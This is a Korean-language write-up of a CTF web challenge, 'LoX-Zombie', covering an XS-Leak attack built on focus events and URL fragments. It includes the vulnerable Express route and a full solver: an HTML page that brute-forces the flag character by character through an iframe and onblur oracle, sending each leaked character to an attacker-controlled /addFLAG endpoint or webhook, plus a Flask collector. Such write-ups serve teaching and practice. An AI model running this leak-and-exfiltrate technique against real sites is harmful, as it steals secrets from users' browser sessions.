# LoX-Zombie

# Usage

# Concept
- XSleak

# Writeup
### 개인적인 생각
저 개인적으로 솔직히 워게임에 XSleak 기법 문제가 상대적으로 다른 기법에 비해 적기도 하고 메이저CTF에서는 자주 나오는 기법이라고 생각해서 이번에  XSleak시리즈로 내볼려고 만들어 봤습니다. 앞으로 XSleak기법들을 대상으로 하나하나 만들어 보려고 합니다. (물론 안될수도 있습니다.) 그리고 아카이브 되면서 XSLeak을 공부하려는 분들에게 교보재가 되어 도움이 되었으면 합니다. 

먼저 문제 제목과 설명처럼 XSLeak을 통해 flag를 leak해야합니다.
### app.js
```js
const isLocal = () => (req, res, next) => (req.connection.remoteAddress === '::ffff:127.0.0.1'|| req.connection.remoteAddress === '::1') 
    ? next() 
    : res.status(403).send('Only LOCAL is allowed');

app.get('/', (req, res) => {
    res.send('hello!!');
});

//isLocal()
app.get('/flag',isLocal(),(req, res) => {
    if (!('flag' in req.query))
        return res.status(200).send('give me flag');

    let flag = req.query.flag;

    if (typeof flag !== 'string')
        return res.status(200).send('give me string type');

    for (let i = 0; i < flag.length; i++) {
        if (flag.charCodeAt(i) < 32 || flag.charCodeAt(i) > 127) {
            return res.status(200).send('plz ascii');
        }
    }

    if (FLAG.startsWith(flag)) {
        HTML = `<button type='submit' id='Zombie'>good try!!</button>`;
        res.send(HTML);
        HTML = '';
    } else {
        res.status(200).send('Flag not matched.');
    }
});
```

```html
<button type='submit' id='Zombie'>good try!!</button>
```
을 반환합니다. 

### 문제 기법
문제 해결을 위한 XSleak기법은 ids-using-focus란 기법입니다. 
간단히 이 기법을 설명하자면 교차사이트에서 focus 이벤트와 url fragment를 활용하여 id가 설정 되어 있는지 확인할 수 있습니다.
iframe에서  https://example.com/foo#bar 를 로드하면 id="bar"란 요소가 있으면 focus이벤트가 발생합니다. 
그러니 우리는 iframe과 #Zombie를 이용한하여 button이 focus된것을 감지하면 flag를 얻을 수 있을 겁니다. 
CSP와 같은 보안헤더등이 따로 존재하지 않아서 leak이 가능합니다.

window.onblur를 통해서 id='Zombie'인 botton태그에 focus를 뺏겼을때를 감지함으로써 flag를 leak을 하는것이 핵심 요소입니다.

### 문제 풀이
문제 풀이에 필요한 코드는 html페이지를 띄우기 위한 app.py와 익스플로잇 코드가 있는 html코드입니다. 
사실 github.io를 이용해서 html과 웹훅사이트로도 가능합니다.

##### index.html
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zombie_Solver</title>
</head>
<body>
    <script>
        (async () => {
            
            const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_ ";

            const leak = async (url) => {
                return new Promise(r => {
                    let iframe = document.createElement('iframe')

                    // we lost focus so id matches
                    window.onblur = async () => {
                        console.debug('onblur fired')
                        window.onblur = ''
                        // we need to wait so chrome dosnt crash when removing the iframe
                        await sleep(100)
                        iframe.remove()
                        return r(1)
                    }

                    // no match
                    setTimeout(() => {
                        window.onblur = ''
                        iframe.remove()
                        return r(0)
                    }, 400) // calibrate timeout based on server's admin bot

                    iframe.src = `${url}#Zombie`

                    document.body.appendChild(iframe)
                })
            }

            const sleep = (ms) => {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            // Repeat this for each letter to get the flag
            let curr = '{{  flag  }}'
            
            for (let i = 0; i < 30; i++) {
                let found = false;
                for (let j = 0; j < ALPHABET.length; j++) {
                    let temp = curr + ALPHABET[j];
                    console.log(`Trying: ${temp}`);
                    fetch("/try..." + decodeURIComponent(temp));

                    if (await leak(`http://localhost/flag?flag=${temp}`)) {                        
                        fetch("/addFLAG?flag=" + decodeURIComponent(ALPHABET[j]));
                        curr += ALPHABET[j];
                        found = true;
                        break;
                    }
                }
                if (!found) break; 
            }
        })()
    </script>
</body>
</html>
```
솔버 코드입니다. github.io를 이용해서 풀려면
fetch("/addFLAG?flag=" + decodeURIComponent(ALPHABET[j]));  이 부분에서 /addFLAG를 웹훅사이트로 바꾸고
let curr = '{{  flag  }}' 이 부분을 추출하고 있는 flag를 넣으면 됩니다. 
봇이 1분동안 방문한 사이트에 대기하기 때문에 한번에 flag를 leak하는 솔브코드는 아닙니다.  

#### solv.py

```py
from flask import Flask, request, render_template

flag = "hspace{"
app = Flask(__name__)

@app.route('/solv')
def solv():
    return render_template('index.html',flag=flag)

@app.route('/addFLAG')
def addFLAG():
    global flag
    
    if 'flag' in request.args:
        flag += request.args['flag']
        print(flag)
        return 'added'
    return 'no flag'


@app.route('/getFlag')
def getFlag():
    return flag


if __name__ == '__main__':
    app.run('0.0.0.0', port=30000)
```
html을 띄우기 위한 app.py입니다. 추출한 flag를 flag변수에 넣으면 됩니다. 아쉽게도 완벽한 자동화 코드는 아닙니다.... 
대략 5,6번 정도 report엔드포인트에 솔버코드가 담긴 url을 넣으면 flag를 완전히 leak할 수 있습니다. 

#### solv 가이드
먼저 app.py를 띄우고 templates디렉토리에 index.html를 넣고 솔브인 html코드를 넣습니다. 그리고 app.py를 포트포워딩 해줍니다. 
(저같은 경우 윈도우에서 wsl사용없이 flask를 작동시켰습니다.)
그뒤에 /report엔드포인트에 http://ip/solv 를 넣으면 try가 나오면서 flag를 leak하고 1분이 지나면 지금까지 leak한 flag를 파이썬 변수에 넣고 다시report엔드포인트에 http://ip/solv를 넣습니다. leak한 flag에 }가 나오면 익스플로잇을 멈춥니다. 
